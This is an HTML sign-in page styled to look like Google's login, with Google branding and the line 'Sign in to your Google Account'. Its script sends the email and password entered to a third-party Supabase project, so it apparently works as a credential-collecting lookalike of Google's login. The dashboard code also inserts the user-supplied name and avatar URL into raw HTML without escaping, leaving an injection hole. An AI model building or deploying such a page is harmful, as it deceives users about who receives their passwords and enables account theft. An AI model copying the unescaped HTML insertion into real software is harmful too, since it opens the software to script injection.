<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign in – Google</title>
  <link
    href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500&display=swap"
    rel="stylesheet" />
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <style>
    *,
    *::before,
    *::after {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    :root {
      --blue: #1a73e8;
      --blue-hover: #1765cc;
      --red: #ea4335;
      --text-primary: #202124;
      --text-secondary: #5f6368;
      --border: #dadce0;
      --bg: #f8f9fa;
      --white: #fff;
      --radius: 8px;
      --shadow: 0 2px 10px rgba(0, 0, 0, .12);
    }

    body {
      font-family: 'Roboto', sans-serif;
      background: var(--bg);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 24px;
      padding: 24px;
    }

    /* ── Card ── */
    .card {
      background: var(--white);
      border: 1px solid var(--border);
      border-radius: 28px;
      width: 100%;
      max-width: 448px;
      padding: 48px 40px 36px;
      text-align: center;
      box-shadow: 0 1px 3px rgba(0, 0, 0, .08);
      animation: fadeUp .35s ease both;
    }

    @keyframes fadeUp {
      from {
        opacity: 0;
        transform: translateY(14px);
      }

      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    /* ── Google Logo ── */
    .google-logo {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 2px;
      margin-bottom: 28px;
    }

    .google-logo svg {
      width: 74px;
      height: 24px;
    }

    /* ── Headings ── */
    h1 {
      font-family: 'Google Sans', sans-serif;
      font-size: 24px;
      font-weight: 400;
      color: var(--text-primary);
      margin-bottom: 10px;
      line-height: 1.25;
    }

    .subtitle {
      font-size: 16px;
      color: var(--text-secondary);
      margin-bottom: 32px;
    }

    /* ── Input ── */
    .field-group {
      text-align: left;
      margin-bottom: 20px;
    }

    .field-group label {
      display: block;
      font-size: 12px;
      color: var(--text-secondary);
      margin-bottom: 4px;
      font-weight: 500;
      letter-spacing: .3px;
    }

    .field-group input {
      width: 100%;
      height: 54px;
      border: 1px solid var(--border);
      border-radius: var(--radius);
      padding: 0 16px;
      font-size: 16px;
      color: var(--text-primary);
      outline: none;
      transition: border-color .15s, box-shadow .15s;
      font-family: inherit;
    }

    .field-group input:focus {
      border-color: var(--blue);
      box-shadow: 0 0 0 3px rgba(26, 115, 232, .15);
    }

    /* ── Forgot link ── */
    .forgot {
      display: block;
      text-align: left;
      font-size: 14px;
      color: var(--blue);
      text-decoration: none;
      margin-top: -8px;
      margin-bottom: 24px;
      font-weight: 500;
    }

    .forgot:hover {
      text-decoration: underline;
    }

    /* ── Primary Button ── */
    .btn-primary {
      width: 100%;
      height: 54px;
      background: var(--blue);
      color: var(--white);
      border: none;
      border-radius: var(--radius);
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      font-family: 'Google Sans', sans-serif;
      letter-spacing: .25px;
      transition: background .15s, box-shadow .15s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .btn-primary:hover {
      background: var(--blue-hover);
      box-shadow: 0 2px 8px rgba(26, 115, 232, .35);
    }

    .btn-primary:active {
      background: #1558b0;
    }

    .btn-primary:disabled {
      opacity: .65;
      cursor: not-allowed;
    }

    /* ── Divider ── */
    .divider {
      display: flex;
      align-items: center;
      gap: 12px;
      margin: 24px 0;
      color: var(--text-secondary);
      font-size: 13px;
    }

    .divider::before,
    .divider::after {
      content: '';
      flex: 1;
      height: 1px;
      background: var(--border);
    }

    /* ── Google OAuth Button ── */
    .btn-google {
      width: 100%;
      height: 54px;
      background: var(--white);
      border: 1px solid var(--border);
      border-radius: var(--radius);
      font-size: 15px;
      font-weight: 500;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      font-family: 'Google Sans', sans-serif;
      color: var(--text-primary);
      transition: background .15s, box-shadow .15s;
    }

    .btn-google:hover {
      background: #f6f9fe;
      box-shadow: 0 1px 6px rgba(0, 0, 0, .12);
    }

    .btn-google svg {
      width: 20px;
      height: 20px;
      flex-shrink: 0;
    }

    /* ── Footer ── */
    .card-footer {
      margin-top: 28px;
      font-size: 14px;
      color: var(--text-secondary);
    }

    .card-footer a {
      color: var(--blue);
      text-decoration: none;
      font-weight: 500;
    }

    .card-footer a:hover {
      text-decoration: underline;
    }

    /* ── Status messages ── */
    .msg {
      padding: 12px 16px;
      border-radius: var(--radius);
      font-size: 14px;
      margin-bottom: 20px;
      display: none;
      text-align: left;
    }

    .msg.error {
      background: #fce8e6;
      color: #c5221f;
      display: block;
    }

    .msg.success {
      background: #e6f4ea;
      color: #1e7e34;
      display: block;
    }

    /* ── Spinner ── */
    .spinner {
      width: 18px;
      height: 18px;
      border: 2px solid rgba(255, 255, 255, .4);
      border-top-color: white;
      border-radius: 50%;
      animation: spin .6s linear infinite;
      display: none;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    /* ── Dashboard (post-login) ── */
    #dashboard {
      display: none;
      width: 100%;
      max-width: 520px;
      animation: fadeUp .35s ease both;
    }

    .dash-card {
      background: var(--white);
      border: 1px solid var(--border);
      border-radius: 28px;
      padding: 40px;
      box-shadow: 0 1px 3px rgba(0, 0, 0, .08);
    }

    .dash-header {
      display: flex;
      align-items: center;
      gap: 16px;
      margin-bottom: 28px;
      padding-bottom: 24px;
      border-bottom: 1px solid var(--border);
    }

    .avatar {
      width: 64px;
      height: 64px;
      border-radius: 50%;
      object-fit: cover;
      border: 2px solid var(--border);
    }

    .avatar-placeholder {
      width: 64px;
      height: 64px;
      border-radius: 50%;
      background: var(--blue);
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 26px;
      font-family: 'Google Sans', sans-serif;
      font-weight: 500;
      flex-shrink: 0;
    }

    .dash-name {
      font-family: 'Google Sans', sans-serif;
      font-size: 20px;
      font-weight: 500;
      color: var(--text-primary);
    }

    .dash-email {
      font-size: 14px;
      color: var(--text-secondary);
      margin-top: 2px;
    }

    .info-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 12px 0;
      border-bottom: 1px solid var(--bg);
      font-size: 14px;
    }

    .info-label {
      color: var(--text-secondary);
      font-weight: 500;
    }

    .info-value {
      color: var(--text-primary);
    }

    .badge {
      display: inline-flex;
      align-items: center;
      gap: 5px;
      background: #e6f4ea;
      color: #1e7e34;
      border-radius: 20px;
      padding: 3px 10px;
      font-size: 12px;
      font-weight: 500;
    }

    .badge::before {
      content: '●';
      font-size: 8px;
    }

    .btn-signout {
      margin-top: 24px;
      width: 100%;
      height: 44px;
      background: transparent;
      border: 1px solid var(--border);
      border-radius: var(--radius);
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      color: var(--text-secondary);
      font-family: 'Google Sans', sans-serif;
      transition: background .15s, border-color .15s;
    }

    .btn-signout:hover {
      background: var(--bg);
      border-color: #bbb;
      color: var(--text-primary);
    }

    /* ── Tabs (Sign in / Sign up) ── */
    .tabs {
      display: flex;
      border-bottom: 1px solid var(--border);
      margin-bottom: 28px;
    }

    .tab {
      flex: 1;
      padding: 12px;
      font-family: 'Google Sans', sans-serif;
      font-size: 14px;
      font-weight: 500;
      border: none;
      background: none;
      cursor: pointer;
      color: var(--text-secondary);
      border-bottom: 2px solid transparent;
      transition: color .15s, border-color .15s;
    }

    .tab.active {
      color: var(--blue);
      border-bottom-color: var(--blue);
    }

    /* ── Bottom page footer ── */
    .page-footer {
      font-size: 12px;
      color: var(--text-secondary);
      display: flex;
      gap: 16px;
    }

    .page-footer a {
      color: var(--text-secondary);
      text-decoration: none;
    }

    .page-footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>

<body>

  <!-- ── Sign-in Card ── -->
  <div class="card" id="authCard">
    <!-- Google Wordmark -->
    <div class="google-logo">
      <svg viewBox="0 0 74 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M9.7 11.3v2.9h4.6c-.2 1.2-.9 2.2-1.9 2.9l3 2.3c1.8-1.6 2.8-4 2.8-6.9 0-.6-.1-1.2-.2-1.8H9.7v.6z"
          fill="#4285F4" />
        <path
          d="M3.8 14.4l-.7.5-2.4 1.9C2.1 19.4 5.7 21.5 9.7 21.5c2.8 0 5.1-.9 6.8-2.4l-3-2.3c-.9.6-2.2 1-3.8 1-2.9 0-5.3-1.9-6.2-4.5l.3.1z"
          fill="#34A853" />
        <path d="M.7 6.7A11.7 11.7 0 0 0 0 10.5c0 1.3.2 2.6.7 3.8L3.8 12A7 7 0 0 1 3.4 10.5c0-.5.1-1.1.2-1.5l-2.9-2.3z"
          fill="#FBBC05" />
        <path
          d="M9.7 3.5c1.6 0 3 .6 4.1 1.6l3-3C15 .8 12.5-.1 9.7-.1 5.7-.1 2.1 2 .7 5.2l3.1 2.4C4.7 5.2 7 3.5 9.7 3.5z"
          fill="#EA4335" />
        <!-- Wordmark "oogle" -->
        <text x="22" y="17" font-family="Product Sans, Google Sans, sans-serif" font-size="16" fill="#4285F4">o</text>
        <text x="29.5" y="17" font-family="Product Sans, Google Sans, sans-serif" font-size="16" fill="#DB4437">o</text>
        <text x="37" y="17" font-family="Product Sans, Google Sans, sans-serif" font-size="16" fill="#F4B400">g</text>
        <text x="44.5" y="17" font-family="Product Sans, Google Sans, sans-serif" font-size="16" fill="#0F9D58">l</text>
        <text x="49" y="17" font-family="Product Sans, Google Sans, sans-serif" font-size="16" fill="#DB4437">e</text>
      </svg>
    </div>

    <!-- Tabs -->
    <div class="tabs">
      <button class="tab active" id="tabSignin" onclick="switchTab('signin')">Sign in</button>
      <button class="tab" id="tabSignup" onclick="switchTab('signup')">Create account</button>
    </div>

    <h1 id="cardTitle">Welcome back</h1>
    <p class="subtitle" id="cardSubtitle">Sign in to your Google Account</p>

    <div class="msg" id="msgBox"></div>

    <!-- Sign in form -->
    <div id="signinForm">
      <div class="field-group">
        <label>Email or phone</label>
        <input type="email" id="siEmail" placeholder="you@gmail.com" autocomplete="email" />
      </div>
      <div class="field-group">
        <label>Password</label>
        <input type="password" id="siPassword" placeholder="Enter your password" autocomplete="current-password" />
      </div>
      <a href="#" class="forgot">Forgot password?</a>
      <button class="btn-primary" id="siBtn" onclick="signIn()">
        <span id="siLabel">Sign in</span>
        <span class="spinner" id="siSpinner"></span>
      </button>
    </div>

    <!-- Sign up form -->
    <div id="signupForm" style="display:none">
      <div class="field-group">
        <label>Full name</label>
        <input type="text" id="suName" placeholder="Your name" autocomplete="name" />
      </div>
      <div class="field-group">
        <label>Email</label>
        <input type="email" id="suEmail" placeholder="you@gmail.com" autocomplete="email" />
      </div>
      <div class="field-group">
        <label>Password</label>
        <input type="password" id="suPassword" placeholder="Min. 6 characters" autocomplete="new-password" />
      </div>
      <button class="btn-primary" id="suBtn" onclick="signUp()">
        <span id="suLabel">Create account</span>
        <span class="spinner" id="suSpinner"></span>
      </button>
    </div>

    <div class="divider">or</div>

    <!-- Google OAuth -->
    <button class="btn-google" onclick="signInWithGoogle()">
      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <path
          d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
          fill="#4285F4" />
        <path
          d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
          fill="#34A853" />
        <path
          d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"
          fill="#FBBC05" />
        <path
          d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
          fill="#EA4335" />
      </svg>
      Continue with Google
    </button>

    <div class="card-footer">
      <span id="footerText">Don't have an account? </span>
      <a href="#" id="footerLink" onclick="switchTab('signup'); return false;">Create account</a>
    </div>
  </div>

  <!-- ── Dashboard (post-login) ── -->
  <div id="dashboard">
    <div class="dash-card">
      <div class="dash-header">
        <div id="userAvatar" class="avatar-placeholder">A</div>
        <div>
          <div class="dash-name" id="userName">Loading…</div>
          <div class="dash-email" id="userEmail"></div>
        </div>
      </div>

      <div class="info-row">
        <span class="info-label">Account status</span>
        <span class="badge">Active</span>
      </div>
      <div class="info-row">
        <span class="info-label">Sign-in provider</span>
        <span class="info-value" id="userProvider">—</span>
      </div>
      <div class="info-row">
        <span class="info-label">Account created</span>
        <span class="info-value" id="userCreated">—</span>
      </div>
      <div class="info-row">
        <span class="info-label">Last sign-in</span>
        <span class="info-value" id="userLastLogin">—</span>
      </div>

      <button class="btn-signout" onclick="signOut()">Sign out</button>
    </div>
  </div>

  <!-- ── Page footer ── -->
  <div class="page-footer">
    <a href="#">Help</a>
    <a href="#">Privacy</a>
    <a href="#">Terms</a>
  </div>

  <script>
    // ── Supabase init ──
    const SUPABASE_URL = 'https://ypnqoaxdpidkzqwyeyyu.supabase.co';
    const SUPABASE_ANON = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlwbnFvYXhkcGlka3pxd3lleXl1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQyOTE3NDIsImV4cCI6MjA4OTg2Nzc0Mn0.FnOnhwLDNXyWvhpSD_NNf4TbiqQnL4Mqdl1BPb9Uwr8';
    const { createClient } = supabase;
    const db = createClient(SUPABASE_URL, SUPABASE_ANON);

    // ── Session check on load ──
    window.addEventListener('DOMContentLoaded', async () => {
      const { data: { session } } = await db.auth.getSession();
      if (session) renderDashboard(session.user);
    });

    // Listen for auth state changes (OAuth callback)
    db.auth.onAuthStateChange((_event, session) => {
      if (session) renderDashboard(session.user);
      else showAuth();
    });

    // ── Tab switching ──
    function switchTab(tab) {
      const isSignin = tab === 'signin';
      document.getElementById('signinForm').style.display = isSignin ? '' : 'none';
      document.getElementById('signupForm').style.display = isSignin ? 'none' : '';
      document.getElementById('tabSignin').classList.toggle('active', isSignin);
      document.getElementById('tabSignup').classList.toggle('active', !isSignin);
      document.getElementById('cardTitle').textContent = isSignin ? 'Welcome back' : 'Create your account';
      document.getElementById('cardSubtitle').textContent = isSignin ? 'Sign in to your Google Account' : 'Enter your details to get started';
      document.getElementById('footerText').textContent = isSignin ? "Don't have an account? " : 'Already have an account? ';
      document.getElementById('footerLink').textContent = isSignin ? 'Create account' : 'Sign in';
      document.getElementById('footerLink').onclick = () => { switchTab(isSignin ? 'signup' : 'signin'); return false; };
      clearMsg();
    }

    // ── Show / hide message ──
    function showMsg(text, type = 'error') {
      const el = document.getElementById('msgBox');
      el.textContent = text;
      el.className = `msg ${type}`;
    }
    function clearMsg() { document.getElementById('msgBox').className = 'msg'; }

    // ── Loading state helpers ──
    function setLoading(btnId, spinnerId, labelId, loading) {
      document.getElementById(btnId).disabled = loading;
      document.getElementById(spinnerId).style.display = loading ? 'block' : 'none';
      document.getElementById(labelId).style.display = loading ? 'none' : 'block';
    }

    // ── Sign In (email) ──
    async function signIn() {
      const email = document.getElementById('siEmail').value.trim();
      const password = document.getElementById('siPassword').value;
      if (!email || !password) { showMsg('Please fill in all fields.'); return; }
      setLoading('siBtn', 'siSpinner', 'siLabel', true);
      clearMsg();
      const { error } = await db.auth.signInWithPassword({ email, password });
      setLoading('siBtn', 'siSpinner', 'siLabel', false);
      if (error) showMsg(error.message);
    }

    // ── Sign Up (email) ──
    async function signUp() {
      const name = document.getElementById('suName').value.trim();
      const email = document.getElementById('suEmail').value.trim();
      const password = document.getElementById('suPassword').value;
      if (!name || !email || !password) { showMsg('Please fill in all fields.'); return; }
      if (password.length < 6) { showMsg('Password must be at least 6 characters.'); return; }
      setLoading('suBtn', 'suSpinner', 'suLabel', true);
      clearMsg();
      const { error } = await db.auth.signUp({
        email, password,
        options: { data: { full_name: name } }
      });
      setLoading('suBtn', 'suSpinner', 'suLabel', false);
      if (error) showMsg(error.message);
      else showMsg('Check your email to confirm your account! ✓', 'success');
    }

    // ── Google OAuth ──
    async function signInWithGoogle() {
      const { error } = await db.auth.signInWithOAuth({
        provider: 'google',
        options: { redirectTo: window.location.href.split('#')[0].split('?')[0] }
      });
      if (error) showMsg(error.message);
    }

    // ── Sign Out ──
    async function signOut() {
      await db.auth.signOut();
    }

    // ── Render dashboard ──
    async function renderDashboard(user) {
      document.getElementById('authCard').style.display = 'none';
      document.getElementById('dashboard').style.display = 'block';

      // Fill from auth user
      const name = user.user_metadata?.full_name || user.email?.split('@')[0] || 'User';
      const email = user.email;
      const avatar = user.user_metadata?.avatar_url;
      const created = new Date(user.created_at).toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
      const lastLogin = new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' });

      document.getElementById('userName').textContent = name;
      document.getElementById('userEmail').textContent = email;
      document.getElementById('userCreated').textContent = created;
      document.getElementById('userLastLogin').textContent = lastLogin;

      // Avatar
      const avatarEl = document.getElementById('userAvatar');
      if (avatar) {
        avatarEl.outerHTML = `<img src="${avatar}" class="avatar" id="userAvatar" alt="${name}" onerror="this.outerHTML='<div class=avatar-placeholder id=userAvatar>${name[0].toUpperCase()}</div>'" />`;
      } else {
        if (avatarEl.tagName === 'IMG') {
          avatarEl.outerHTML = `<div class="avatar-placeholder" id="userAvatar">${name[0].toUpperCase()}</div>`;
        } else {
          avatarEl.textContent = name[0].toUpperCase();
        }
      }

      // Get auth provider from app_metadata
      const provider = user.app_metadata?.provider || 'email';
      document.getElementById('userProvider').textContent =
        provider === 'email' ? 'Email / Password' : provider.charAt(0).toUpperCase() + provider.slice(1);
    }

    function showAuth() {
      document.getElementById('authCard').style.display = '';
      document.getElementById('dashboard').style.display = 'none';
    }

    // Enter key support
    document.addEventListener('keydown', e => {
      if (e.key !== 'Enter') return;
      if (document.getElementById('authCard').style.display === 'none') return;
      if (document.getElementById('signinForm').style.display !== 'none') signIn();
      else signUp();
    });
  </script>
</body>

</html>
